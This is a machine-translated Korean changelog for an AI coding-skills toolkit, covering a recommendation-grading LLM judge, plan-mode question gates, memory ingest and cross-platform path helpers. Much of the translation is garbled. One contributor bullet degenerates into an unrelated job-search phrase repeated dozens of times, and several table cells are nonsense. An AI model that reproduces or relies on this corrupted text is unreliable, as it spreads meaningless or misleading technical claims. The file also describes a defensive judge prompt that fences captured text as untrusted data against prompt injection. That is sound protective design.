- `retro/SKILL.md.tmpl` — 3개의 쿼리 (prior-retros fs + 최근 타임 라인 fs + 최근 학습 fs)

#### 추가 — 설정 GBrain idempotent 의사 + ref doc

- `setup-gbrain/SKILL.md.tmpl` 단계 7.5 — Transcript & 메모리 ingest gate. Probe → 침묵하는 대량 경우 < 200 세션 / 100MB → AskUserQuestion 와 5-option gate 그렇지 않으면 (이 repo 마지막으로 90d / 모든 역사 / 모든 저장소 / 증가 / 절대).
- `setup-gbrain/SKILL.md.tmpl` 단계 10 - GREEN/YELLOW/RED verdict 구획. 재 실행 /setup-gbrain는 이제 CLI/엔진/인/MCP/Repo 정책/코드 수입/ 기억 sync/Transcripts/CLAUDE.md/연기를 위한 검출→report 줄을 가진 일류 의사 경로입니다.
- `setup-gbrain/memory.md` — 사용자가 참여하는 참조를 덮는 것은 ingested + 로컬 + 비밀 스캐닝 + 저장 계층화 + 쿼리 + 삭제 + 에이전트가 + 복구 케이스를 사용하는 방법 +.

#### 추가 — 테스트

- `test/gstack-memory-helpers.test.ts` - 모든 5 public 돕는 22 단위 시험
- `test/gstack-memory-ingest.test.ts` - 15개의 테스트 덮음 CLI 표면, --모든 소스 유형, 국가 파일 수명주기, schema mismatch + JSON 손상 백업에 대하여, truncated JSONL 취급
- `test/gstack-gbrain-sync.test.ts` — 8개의 테스트 덮음 --help, unknown flag rejection, --dry-run 미리보기, --no-code 단계 뚜렷한, 국가 파일 수명주기, 단계 결과 기록
- `test/gstack-brain-context-load.test.ts` - 10개의 시험 덮음 CLI 표면, default 가을, 외관 파견, datamark 봉투 포장, 렌더링_as 템플렛 대용, 녹지 않는 템플렛 var 건너뛰기, --quiet 억제, 우아한 gbrain-CLI-absence
- `test/skill-e2e-memory-pipeline.test.ts` — 10 E2E는 8개의 정착물 파일 유형을 가진 가득 차있는 차선 A → B → C 가치 반복을 exercising

#### 변경

- `package.json` 버전 1.25.1.0 → 1.26.0.0
- `VERSION` 1.25.1.0 → 1.26.0.0

#### 기여자

- `/Users/garrytan/.claude/plans/ok-actually-lets-go-luminous-thacker.md` (~890 라인)의 계획 파일은 사무실 시간 발견을 포함하여 canonical V1 디자인 근원, CEO 검토 확장 (6 체리 피크 허용, 1개의 reverted+replaced), Codex 외부 음성 10 발견 (F1-F10 각 해결 또는 deferred), eng 검토 추가 (ED1 + ED2 + 6/> 자동적인 F10를 가진 F10를, 그리고 완전한 단면도로 계획합니다.
- Manifest schema는 versioned (`gbrain.schema: 1`); 미래의 형식은 schema를 범프하고 명시된 마이그레이션을 요구합니다. gen-skill-docs는 빌드 시간 (종류 / 정렬별 필수 필드 / 템플릿 var resolution / 고유 ID)에서 스키마를 검증합니다.
- Lane D (cross-repo `gbrain restore-from-sync` 의 원자 스왑 + 7 일 .bak 유지 D11 ) 은 V1.5 P0 TODO 으로 문서화 됩니다. gstack repo 은 gbrain CLI repo 으로 쓸 수 없습니다.
- 검색 결과를 찾을 수 없음 한국어 사전에 온라인 구직을 보완하거나 다른 방법으로 광고하는 경우, 키워드, 직위 또는 회사 이름을 입력하고있는 키워드, 회사 또는 회사 이름을 입력하고있는 키워드, 회사 또는 회사 이름을 입력하고있는 키워드, 회사 또는 회사 이름을 입력하고있는 키워드, 회사 이름을 입력하고있는 회사 이름을 입력하고있는 회사 이름을 입력하고 입력 한 회사 이름을 입력하고 입력 한 회사 이름을 입력하고 입력 한 회사 이름을 입력하고 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력하고 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력 한 회사 이름을 입력
- gitleaks 공급 업체는 V1.0.1 후속; V1.0의 경우, 돕는 PATH에 gitleaks를 예상하고, 누락된 경우 경고합니다. `brew install gitleaks` 에 macOS 는 공급 업체 바이너리 배까지 덮여 얻게 됩니다.

## [1.25.1.0] - 2026-05-01

## **사무실 시간 단계 4 건축 포크에 중지. AskUserQuestion evals — and `/codex` 종합 - 이제 "because"항목을 등급을 매기.**

빌드 모드에서 `/office-hours`를 실행하면 단계 4 (Alternatives Generation)에 도달하면, 에이전트는 이제 실제로 "Recommendation: C because..."를 쓰고 디자인 doc에 똑똑하게 진행하는 대신 A/B/C 사이에서 선택하도록 요청합니다. 이전 단계 4 footer는 soft prose (" AskUserQuestion을 통해 제시되었습니다. NOT는 사용자 승인없이 진행하십시오"); `plan-ceo-review`의 0C-bis 게이트에서 `STOP.` 패턴을 한 새로운 일치는, 블록 다음 단계 (상 4.5 / 상 5 / 상 6 / 디자인 문서 생성)를 이름, 그리고 "잘 승리 접근을 거부합니다.

AskUserQuestion의 형식 준수 evals는 이제 `Recommendation:` 라인이 존재한다는 것을 확인하는 것보다 더 많은 것을 합니다. 새로운 Haiku 4.5 판사는 1-5 물질 루퍼릭의 "because <reason>" 절을 등급을 매깁니다. 5 = 특정 거래가 대안을 대리합니다. 3 = 일반 ( "더 빠르기 때문에"); 1 = 보일러판. 시험은 임계값 ≥ 4에서 실패, 에이전트가 "Recommendation : B"을 쓰고 있지만 더 나은 사용으로 인해 정확한 실패 모드를 잡습니다.

동일한 의장은 구조상 권고 없이 예언된 prose를 방출하는 **cross-model 종합 표면**에 확장합니다. `/codex review`, `/codex challenge`, `/codex consult`, Claude adversarial subagent (plus Codex's adversarial 통행은 `/ship` 단계 11)에 지금 MUST 방출한 대문 `Recommendation: <action> because <reason>` 그들의 종합의 끝에 canonical `Recommendation: <action> because <reason>` 선을. 이 이유는 대안에 대해 비교해야합니다 (다른 발견, 수정 vs-ship, 수정 주문 거래) - 일반적인 합성 ( "진행 검토가 발견 된 것") 포맷 검사 실패.

### 지금 할 수있는 일

- **지휘자에 있는 `/office-hours` 건축업자 형태를 실행하고 단계 4 문을 신뢰하십시오.** 건축 포크 (서버 측 대 클라이언트 측 대 잡종, 또는 어떤 모양든지 당신의 프로젝트가) 실제로 당신을 위한 표면 결정합니다. 에이전트은 당신이 반응할 때까지 단계 4에 감기를 멈추습니다.
- **CI의 약한 권고를 잡습니다.** `/plan-ceo-review`, `/plan-eng-review`, `/office-hours`에 주기적인 층 evals는 Haiku 4.5 (~$0.005/judge 외침)를 통해 추천 물질을 등급을 매깁니다. 일반적인 "더 빠르기 때문에"는 문이 실패합니다.
- **`/codex` 실행 중 동작 가능한 줄을 가져옵니다.** 검토, 도전, 그리고 지금 `Recommendation: <action> because <reason>`로 끝나는 형태를 상담하십시오 - 당신이 가득 차있는 Codex 성적을 재읽지 않고 행동할 수 있습니다. Claude adversarial subagent와 Codex adversarial 통행을 위해 `/ship` 단계 11에서 자동 실행하는.

### 중요 한 숫자

출처: 이 branch (`EVALS=1 EVALS_TIER=periodic bun test ...`)에서 지불된 타원형. 6개의 권고 질 evals: 4개의 계획 체재 + 1개의 사무실 시간 단계 4 + 1개의 정착물 산성 시험.

| Metric | 의 전 | 후지후 | Δ |
|---|---|---|---|
| 개인정보취급방침 | regex 만 (`Choose` 리터럴 필요) | regex + 하이쿠 4.5 판사 | 물질 등급 |
| 사무실 시간 단계 4 침묵하는 자동 decide | possible | 회귀 시험 문 | trapped |
| 단계 4 eval 비용 당 실행 | n/a (테스트가 존재하지 않았다) | $0.36, 4 회전, 36s, 물질 5 | 의 새로운 |
| 계획형 판사 임계값 | none (regex 전용) | `reason_substance >= 4` | 의붓기 |
| 시험용 고정 적용 | 수동 반전/re-apply sabotage | 13의 손으로 급료 정착물 | 의향상 |
| `judgeRecommendation` branch 적용 | n/a | 14/14 (100%) | 의 새로운 |

### 이 빌더를 위한 뜻

빌드 모드에서 `/office-hours`를 실행하고 디자인 doc을 통지하면 버그가 발생하지 않은 경우 건축 선택이 구워졌습니다. 4의 발걸음은 문과 합리화에서 에이전트를 유지하기에 충분하지 않았습니다. 업그레이드 후 에이전트가 중지, 요청 및 대기합니다.

`Recommendation: <choice> because <reason>`와 기술 템플릿을 쓰고 있는 경우, 때로는 신형 이유를 배운 에이전트를 사용하지 않고, 새로운 판단은 그 잡을 수 있다. 당신의 기술에 대한 형식 회귀 evals를 실행 (또는 자신의 E2E 테스트로 패턴을 복사) 하쿠는 그 때문에 clause 물질을 평가한다. 일반적인 이유는 임계값 4에 실패; 특정 거래 이유 (수준 5) 패스.

### 항목화 된 변경

#### 추가 — 판단자등록 돕기 + 회귀 시험

- `test/helpers/llm-judge.ts`는 `judgeRecommendation()`와 `RecommendationScore` 인터페이스를 얻고 있습니다. 층을 깔아 디자인: 세례적인 regex는 `present`/ `commits`/ `has_because` (no LLM)를 파고하고, 함수는 물질을 즉시 그 때 떨어질 때 물질을 돌려줍니다) 돌려보냅니다. Haiku 4.5는 단단한 rubric scoped에 1-5 `reason_substance` 축선만 급료를 가진 종결되지 않기 때문에, 그 자체 메뉴에 비례하지 않기 때문에.
- `callJudge()`는 Sonnet 4.6에 기본적으로 선택적인 모형 arg로 전형적으로 합니다. 엑시스트 콜러 (`judge`, `outcomeJudge`, `judgePosture`)는 바꾸지 않았습니다.
- `test/skill-e2e-office-hours-phase4.test.ts` (새로운, 정기적인 층) - SDK + `captureInstruction` 반복 시험은 단계 4 침묵 자동 진드기 버그를 위해 시험합니다. AskUserQuestion 체재 + 단계 4 단면도를 `office-hours/SKILL.md` (CLAUDE.md "extract, 복사하지 마십시오")에서 추출하십시오. 전체 기술, 저장 ~30% Opus 토큰에 달하는 보다는 오히려.
- `test/llm-judge-recommendation.test.ts` (새로운, 정기적인 층) - 물질 5/4/3/1, no-because, no-recommendation 및 6개의 명백한 hedging 모양을 덮는 13의 손으로 급료 정착물. 본래 "수립한 파일로 나쁜 원본을 주사하고 SKILL 템플렛"를 표류하는 부정적인 적용을 가진 sabotage 단계 뒤집습니다.
- `test/helpers/e2e-helpers.ts` 을 얻 `assertRecommendationQuality()` + `RECOMMENDATION_SUBSTANCE_THRESHOLD` 상수. 5x 복제 22-line 판사 보조 블록 (4 계획 형식 케이스 + 1 단계 4) 단일 헬퍼 호출로.

#### 창설 — 사무실 시간 단계 4 STOP 문

- `office-hours/SKILL.md.tmpl` 4개 발기자는 단단한 `**STOP.**` token (`plan-ceo-review/SKILL.md.tmpl:248-252`의 0C-bis 본을 묶는) 막힌 다음 단계 (단계 4.5 Founder 신호 Synthesis, 단계 5 디자인 Doc, 단계 6 결산, 디자인 문서 생성) 및 명시적인 anti-rationalization 선 (" 명확하게 승리 접근법은 여전히 접근법입니다"). 전방의 경로를 보존하십시오 (-vari-plan).
- `test/skill-e2e-plan-format.test.ts` - 새로운 판단을 모든 4개의 케이스 (CEO 형태, CEO 접근, eng 적용, eng 종류)로 전사했습니다. `reason_substance >= 4`는 보일러판과 일반적인 층 이유를 둘 다 붙잡습니다. 엄격한 `Choose` regex (수직 체재 spec는 선택권 상표를, 리터 "Choose" 접두사 아닙니다 요구합니다) 필요로 합니다. `COMPLETENESS_RE`는 선택권 전사적으로 `generate-ask-user-format.ts`에 의하여 형성된 형태 `generate-ask-user-format.ts`를 개정하는 것을 `generate-ask-user-format.ts`.
- `test/helpers/touchfiles.ts` — 새로운 항목 `office-hours-phase4-fork` (기간) 및 `llm-judge-recommendation` (기간); `test/helpers/llm-judge.ts`를 가진 4개의 `plan-{ceo,eng}-review-format-*` 항목이 확장해, 이렇게 철수 검사를 유효하게 하는 윤활유 tweaks.

#### 추가 — cross-model 종합 권고 요건

- `codex/SKILL.md.tmpl` 2A (challenge), 2B (challenge), 2C (consult)는 각각 "Synthesis 권고 (REQUIRED)"의 하위 섹션을 얻습니다. Codex의 동사 출력을 제시 한 후, 관현관은 동일한 운하 모양 `Recommendation: <action> because <reason>` 선을 `judgeRecommendation` 이미 등급으로 방출해야합니다. 템플릿은 비교 작풍 이유를 가르치고 (다른 발견, 또는 수정 물질을 비교하십시오.).
- `scripts/resolvers/review.ts` Claude adversarial subagent 신속하고 Codex adversarial 명령은 둘 다 동일한 최종선 요구에 응합니다. Claude subagent in `/ship` Step 11는 지금 canonical 권고로 그것의 발견 목록을 끝냅니다; 그것과 함께 달리 달리 달리는 Codex adversarial 통행을 위해 동일하십시오.
- `test/llm-judge-recommendation.test.ts` 5개의 단 모형 정착물 (3개의 물질 ≥ 4 덮음 review/adversarial/consult 모양, 2개의 물질 < 4 덮음 보일러판)로 확장해. 동일한 `judgeRecommendation` 돕는 사람 급료 둘 다 AskUserQuestion와 크로스 모델 종합 — 1개의 문지름, 2개의 표면.
- `test/skill-cross-model-recommendation-emit.test.ts` (새로운, 자유 계층) - 정적 가드 그 greps `codex/SKILL.md.tmpl` 및 `scripts/resolvers/review.ts` canonical 방출 지시를 위해. 기여자가 템플렛을 편집하고 종합적인 필요조건을 제거합니다 지불하기 전에 여행.

#### Defense — 판단 프롬프트 + 출력

- 캡처 AskUserQuestion 텍스트는 명확하게 `<<<UNTRUSTED_CONTEXT>>>` 블록에 저장된 심판 프롬프트에서 "데이터로 콘텐츠, 명령" 명령을하지 않고. 신속한 주사 패턴을 포함하는 캡처 된 텍스트에 대한 저렴한 방어.
- Haiku 산출에 방어적인 죔쇠: `reason_substance`는 1-5 (범위 또는 비핵 coerces에 1)에 coerced 입니다 그래서 유효하지 않은 LLM 산출은 침묵하게 문턱 체크를 통과하지 않습니다.
- 캡처 텍스트 예산은 4000 → 8000 숯을 범람; ~800 숯에서 4 옵션이있는 실제 계획 형식 메뉴는 중급을 쌓아 왔습니다.

#### 기여자

- `commits` 세례적인 체크는 이제 전체 권고 몸이 아닌 선택 부분 (텍스트 전에 "because") 만 스캔합니다. 때문에-클로즈 내부 Redis에 의존하지 않는 "계획은 여전히 Redis에 의존하지 않는"와 같은 합법적 인 기술 구문이 긍정적 인 것을 방지합니다.
- 교체 당 한 개의 고정 장치 (`either`, `depends? on`, `depending`, `if .+ then`, `or maybe`, `whichever`)로 핀으로 꼿는 regex - branch 적용은 9/14에서 `judgeRecommendation`에 14/14에 갔다.
- "AUQ" 의약정을 `office-hours/SKILL.md.tmpl` 4 단계로 곱하고 2는 항상 씁니다-전체 메모리 규칙 당 의견을 시험합니다.

## [1.25.0.0] - 2026-05-01

## **Plan-mode 기술 표면은 다시 결정합니다. 호스트가 AskUserQuestion을 훔칠 때도.**

Claude Code (`--disallowedTools AskUserQuestion --permission-mode default --permission-prompt-tool stdio`) (`ps`를 통해 살아있는 지휘자 claude 과정을 검열해서)를 가진 지휘자 발사합니다. 본래 AskUserQuestion 도구는 모형의 도구 레지스트리에서 제거됩니다, 그래서 계획 형태 기술이 "call AskUserQuestion에 모형을 지시할 때,”는, 침묵하게 실패합니다: 모형은 요구할 수 없습니다, 사용자는 결코 질문을 볼 수 없습니다, 그리고 기술 자동 보호해 입력 없이. `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`, `/autoplan`, `/office-hours`의 전체적인 상호 작용하는 전제는 어떤 지휘자 회의에서 부서졌습니다.

수정은 기술 템플릿 수술이 아닌 사전 안내입니다. `scripts/resolvers/preamble/generate-ask-user-format.ts`의 새로운 `Tool resolution` 섹션은 도구 목록을 확인하고 기본 도구에 `mcp__*__AskUserQuestion` 변형 (예 : `mcp__conductor__AskUserQuestion`)을 선호하는 모델을 알려줍니다. 기본 AskUserQuestion를 비활성화하는 호스트는 MCP 변형을 등록합니다. 변형은 동일한 질문을 /options 모양과 호스트는 자체 UI 표면을 통해 프롬프트를 렌더링합니다. 변형이 호출되지 않는 경우, 모델은 계획 파일로 `## Decisions to confirm` 섹션을 작성하고 ExitPlanMode를 호출하는 것입니다. — 계획 모드의 기본 "읽기"를 실행하려면?" 확인은 TTY UI를 통해 결정합니다. **절대로 자동 변형.**

6개의 문 층 진짜PTY 회귀 시험은 각 계획 형태 기술을 위해 정확한 지휘자 깃발 세트 (`extraArgs: ['--disallowedTools', 'AskUserQuestion']`)를, 및 정당한 `/plan-tune` AUTO_DECIDE를 보호하는 주기적인 층 eval를 고치는 정형외선을 위해 놓습니다. 고침에 의해 끊기에서 끄는 경로. The harness gains a new `'auto_decided'` outcome and whitespace-tolerant detectors that survive TTY cursor-positioning escape sequences (which `stripAnsi` removes without leaving spaces, collapsing "ready to execute" to "readytoexecute").

### 지금 할 수있는 일

- **도체의 계획 모드 검토 기술을 사용합니다.**는 지휘자 workspace를 열고, 계획에 대하여 `/plan-ceo-review`를 달고, 범위 형태 질문은 실제로 당신을 위해 대답하기 위하여 나타납니다. `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`, `/autoplan`의 전제 문 및 `/office-hours`를 위해 동일.
- **템플릿을 작성하지 않고 `--disallowedTools`의 제어를 유지하십시오.** 도구 해상도 섹션은 모든 계층 ≥2 기술에서 1의 골무 위치에 앉아; 동일한 패턴을 통해 기본 AUQ를 비활성화 새로운 호스트는 MCP 변형을 등록 한 것과 같이 고정을 투명하게 얻을.
- **회귀 가드를 잃지 않고 AUTO_DECIDE로 옵트인.** `/plan-tune` 특정한 질문에 대한 `never-ask`를 설정한 사용자는 지휘자 깃발의 밑에 자동 펀치를 지킵니다; 주기적인 층 `auto-decide-preserved` eval는 이 경로를 보호합니다.

### 중요 한 숫자

출처: 회귀 메커니즘 (확인 된 기본 소스)에 대한 `ps -p <conductor-claude-pid> -o args=`. 6 새로운 게이트 층 회귀 케이스 + 1 주기적인 층 AUTO_DECIDE eval; `test/skill-e2e-plan-{ceo,eng,design,devex}-plan-mode.test.ts` (임대 인라인)에 적용 + `test/skill-e2e-{autoplan,office-hours}-auto-mode.test.ts` (독립) + `test/skill-e2e-auto-decide-preserved.test.ts` (임시).

| Surface | 의 특징 |
|---|---|
| 지휘자에 상호 작용하는 기술 | 6 (`/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`, `/plan-devex-review`, `/autoplan`, `/office-hours`) |
| 새로운 문 층 회귀 시험 케이스 | 6 (기술 당 1개; `--disallowedTools AskUserQuestion` 모수로 지정하는) |
| 새로운 시대의 eval | 1 (`auto-decide-preserved`, `/plan-tune` 옵트인 경로 보호) |
| 새로운 `ClassifyResult` outcome | `auto_decided` — TTY는 “자동 유래 ... (당신의 선호도)”를 보여줍니다 |
| 새로운 `runPlanSkillObservation` 모수 | `extraArgs?: string[]` - `claude`를 스파게 펴는 매립자 원시 깃발 |
| Preamble 해결사 터치 | 2 (`generate-ask-user-format.ts`, `generate-completion-status.ts`) |
| SKILL.md 파일 재생 | 41 |
| `classifyVisible` branch 순서 | `silent_write` → `auto_decided` → `plan_ready` → `asked` (다음보다 더 특정한) |
| Whitespace-tolerant 검출기 | `isPlanReadyVisible`, `isAutoDecidedVisible` (스트레잇 스트립Ansi 커서 위치 붕괴) |
| 인증: CE | `ps -p <conductor-claude-pid> -o args=` `--disallowedTools AskUserQuestion --permission-mode default`를 보여주기 |

### 이 빌더를 위한 뜻

`/plan-ceo-review` 또는 이 릴리스 전에 지휘자에 있는 계획 형태 검토 기술이 ran 경우에, 기술 침묵하게 당신이 모양을 하지 않은 계획을 생성합니다 — 범위 형태 질문, 확장 제안 및 per-section STOPs는 결코 당신을 도달하지 않았습니다. 격상 후에, 기술은 각 문에 대한 정지를 정의합니다. 수정은 preamble에 있습니다, 그래서 당신은 단지 업그레이드 gstack를 달고 다음 계획 검토는 당신이 당신의 입력을 명예롭게 합니다.

`/plan-tune`를 통해 자동 결정 특정 질문을 선택하면, 주기적인 eval는 경로가 감시합니다. 수정은 "prefer MCP 변종 때 등록되지 않습니다"라는 것입니다. "표면에 모든 질문을 강제하지 마십시오"- `never-ask` 설정은 여전히 자동 진폭, AUTO_DECIDE 표기는 여전히 렌더링, 선택된 사용자의 변경이 없습니다.

gstack-side 회귀 테스트 표면은 이제 실제 사용자가 히트한 것을 미러링합니다. 각 계획 모드 테스트 파일은 `extraArgs: ['--disallowedTools', 'AskUserQuestion']`를 설정하고 AskUserQuestion를 설정하는 두 번째 `test()` 블록을 얻었다. v1.21.1.0의 `classifyVisible()` 추출 - 새로운 자동 변형 branch 슬롯은 침묵_쓰기 및 계획_ready 사이에 깨끗하게합니다.

### 항목화 된 변경

#### 추가 — 도구 해결책 preamble

- `scripts/resolvers/preamble/generate-ask-user-format.ts`는 AskUserQuestion 형식 블록의 상단에 새로운 `### Tool resolution (read first)` 섹션을 가져옵니다. 모델에 대해 설명합니다. AskUserQuestion는 runtime (host MCP 변종 또는 네이티브); 기본 도구 목록에서 `mcp__*__AskUserQuestion` 변종을 선호합니다. 호스트는 `--disallowedTools AskUserQuestion` (Conductor는 default); 동일한 질문/options 모양과 결정 브리프 형식의 변형을 사용하여 기본으로 비활성화 할 수 있습니다. MCP (Conductor는 default); 같은 문제 /options 형태와 결정 브리프 형식의 변형을 적용하십시오. 변형이 호출되지 않을 때의 fallback 경로가 포함되어 있습니다. `## Decisions to confirm` +PlanMode로 계획 파일에 대한 결정을 작성하십시오.
- `scripts/resolvers/preamble/generate-completion-status.ts` (프레임 위치에 계획 형태 정보 구획 1) 도구 해결책 단면도에 점에 새롭게 하는: AskUserQuestion satisfies 계획 형태는 “무변이를 위한” 어떤 변종을 위한 “무변이,”를 위한 계획 파일 fallback를 위한 끝의 끝의 필요조건을 계획합니다.

#### 추가 — 회귀 테스트

- 4 인라인 `test()` 블록은 `test/skill-e2e-plan-{ceo,eng,design,devex}-plan-mode.test.ts`에 추가되었습니다. `extraArgs: ['--disallowedTools', 'AskUserQuestion']`와 각 스파드는 기술이 아직도 표면을 손상시킵니다 — 통행 봉투 `['asked', 'plan_ready']` (후자는 계획 파일 fallback 교류를 커버합니다), 실패 신호는 `'auto_decided'` (표면적으로 붙은)와 표준 silent_write/exited/timeout.입니다
- `test/skill-e2e-autoplan-auto-mode.test.ts` (새로운). autoplan의 첫번째 비 자동 decided 문 (단계 1개의 전제 확인)를 아직도 표면 검사합니다. Autoplan 자동 decides 중간 질문 BY DESIGN, 그래서 사용자 MUST 보기를 문에 시험 범위.
- `test/skill-e2e-office-hours-auto-mode.test.ts` (새로운). 사무실 시간의 시작 Vs 건축업자 형태 AskUserQuestion 아직도 표면을 원조하십시오.
- `test/skill-e2e-auto-decide-preserved.test.ts` (새로운, 정기적인 층). 격리된 `GSTACK_HOME` tmpdir를 설정하고 `question_tuning=true` + `plan-ceo-review-mode` (출처 `'plan-tune'`)에 대한 `never-ask` (출처 `/plan-ceo-review`)를 `--disallowedTools AskUserQuestion`, asserts outcome는 NOT `'asked'` (선택에서 명예를 주는 모형) `/plan-ceo-review`를 씁니다.

#### Changed — PTY 마구

- `test/helpers/claude-pty-runner.ts`: `runPlanSkillObservation`는 새로운 선택 `extraArgs?: string[]` (`launchClaudePty`로, 이미 지원한 분야를 통해서 똑바른 plumbs)를 받아들입니다. `ClassifyResult`는 AUTO_DECIDE preamble 템플렛 (`Auto-decided … (your preference)`)와 일치하는 `isAutoDecidedVisible(visible)` 발견자 플러스 `isAutoDecidedVisible(visible)`를 얻습니다. `classifyVisible` branch 순서는 `silent_write → auto_decided → plan_ready → asked`에 확장했습니다 그래서 상류 자동 분리는 다운스트림 계획 형태 확인에 의해 복종되지 않습니다.
- Whitespace-tolerant detection: `isPlanReadyVisible` 과 `isAutoDecidedVisible` 이제 모두 공간과 백스페이스-collapsed 형태의 대상 구문을 테스트합니다. `stripAnsi`는 공백과 교체하지 않고 커서 위치 탈출 (`\x1b[40C`)을 제거하므로 "readytoexecute"로 이동할 수 있습니다. - 우주 복부가 놓을 것입니다.

#### Changed — 터치파일

- `test/helpers/touchfiles.ts`: 기존 `plan-X-review-plan-mode` 항목이 `scripts/resolvers/question-tuning.ts`와 `scripts/resolvers/preamble/generate-ask-user-format.ts`를 터치파일 의존성으로 증가시키면 AUTO_DECIDE-bearing resolver가 반복적인 경우에 제대로 유효하게 변화합니다.
- 새로운 항목 : `autoplan-auto-mode` (게이트), `office-hours-auto-mode` (게이트), `auto-decide-preserved` (기간).
- `test/touchfiles.test.ts`: 19에서 21까지의 `plan-ceo-review/SKILL.md` 업데이트로 선정된 테스트의 수를 `plan-ceo-review/**`에 따라 새로운 항목을 커버합니다.

#### 기여자

- PTY 하네스 `auto_decided` outcome는 방어적인 신호입니다: 그것은 비 결정적인 인 AUTO_DECIDE preamble 템플렛 낱말에 불립니다. 회귀의 증거로, 단단한 계약 아닙니다 대우하십시오.
- 도구 해상도 섹션은 기본적으로 AUQ를 다르게 비활성화하는 모든 미래 호스트를위한 외과 고정 사이트입니다. 패턴 : `mcp__<host>__AskUserQuestion` MCP 도구를 등록하십시오. gstack는 이미 모델을 선호하는 것을 알려줍니다. No 기술 템플릿 변경은 per-host에 필요합니다.
- `auto-decide-preserved`는 개발자의 실제 `~/.gstack` 국가를 mutating하는 것을 피하기 위하여 고립된 `GSTACK_HOME` tmpdir에서 뛰기. 디버깅할 때, 찰상 디버에 `GSTACK_HOME`를 수동으로 놓고 동일한 체제를 실행하십시오 (`gstack-config set question_tuning true`, 그 후에 `gstack-question-preference --write`).

## [1.24.0.0] - 2026-04-30

## **크로스 플랫폼 경화. Mac + Linux 전체, 큐레이터 Windows 라네 추가.**

v1.24.0.0 ports the McGluut fork's portability work into upstream and adds a curated Windows test job that actually runs green. `bin/gstack-paths` consolidates state-root resolution behind one helper sourced via `eval "$(...)"` from skill bash blocks; eight skills (`careful`, `freeze`, `guard`, `unfreeze`, `investigate`, `context-save`, `context-restore`, `learn`, `office-hours`, `plan-tune`, `codex`) move off inline `${CLAUDE_PLUGIN_DATA:-...}` chains. `Bun.which()` replaces 75 lines of fork-side PATH-resolution code in a new `browse/src/claude-bin.ts` wrapper, wired through five hardcoded `claude` spawn sites. A new `windows-free-tests` GitHub Actions job runs a curated 103-test subset on `windows-latest` plus targeted resolver tests; `evals.yml` stays Linux-container as it should. `AGENTS.md` and `docs/skills.md` sync to the live skill inventory (40+ skills, was 21); `/debug` → `/investigate`, missing skills added, stale `<5s` `bun test` claim dropped. McGluut 포크에 적립된 방향을 강하게 합니다.

### 중요 한 숫자

지점 합계는 `git diff --shortstat origin/main..HEAD`에서 각 차선 땅 후에 옵니다. 치료 수는 `bun run scripts/test-free-shards.ts --windows-only --list`에서 옵니다.

| Metric | Δ |
|---|---|
| 새로운 공유 된 해결자 | **2개의 단위** — `bin/gstack-paths` (61 LOC), `browse/src/claude-bin.ts` (73 LOC) |
| Inline 상태 루트 체인 통합 | **8 기술** (초기 범위에서 5 개; T1에서 3 개 더 찾아보기) |
| Hardcoded `claude` spawn 사이트 재선식 | **5개 사이트** — `security-classifier.ts:396`, `:496`, `preflight-agent-sdk.ts`, `helpers/providers/claude.ts`, `helpers/agent-sdk-runner.ts` |
| 포크의 95-LOC `claude-bin.ts` 재조정 | **−75 선** - `Bun.which()` + 18 LOC 로 대체 |
| Windows 안전 curated 잠수함 | **128 무료 테스트의 103** (80%)는 `windows-latest`에 달합니다; 25 이유와 제외하십시오 |
| 새로운 테스트 추가 | **+31 테스트** - gstack-paths (8), claude-bin (9), 테스트-free-shards (14) |
| 새로운 invariant 테스트 | **+3** - `test/skill-validation.test.ts`의 개인 경로 누출 검출기 + 2 doc-inventory 크로스 검사 |
| 기술 재고 문서 | **40+ 기술** AGENTS.md + docs/skills.md (AGENTS.md에서 21를 가진 `/debug` → `/investigate`) |
| 무료 테스트 스위트 | **318 패스, 0 실패** (`bun test test/skill-validation.test.ts`) |

| 제품정보 | 의논하기 |
|---|---|
| `bin/gstack-paths` | 모든 3개의 fallback 사슬을 덮는 8개 단위 시험 |
| `browse/src/claude-bin.ts` | override-PATH-resolution case를 포함하여 9개의 단위 시험은 포크의 버전에 의하여 틀린 얻었다 |
| `scripts/test-free-shards.ts` | 14 단위 테스트 덮음 열, sharding, 및 Windows-fragility 탐지 |

### 이 빌더를 위한 뜻

**Plugin 설치 작업.** Claude Code 플러그인으로 gstack를 설치하면 `CLAUDE_PLUGIN_DATA`와 `CLAUDE_PLANS_DIR`가 각 기술의 배쉬 블록을 통해 흐름을 흘려줍니다. 이전 8개의 기술이 하드코드 `${GSTACK_HOME:-$HOME/.gstack}` 인라인으로; 이제 그들은 모든 소스 `bin/gstack-paths`를 선택하고 플러그인 관리 루트를 자동으로 선택합니다. No 더 많은 "플러그인 설치는 자체 상태를 찾을 수 없습니다"발군.

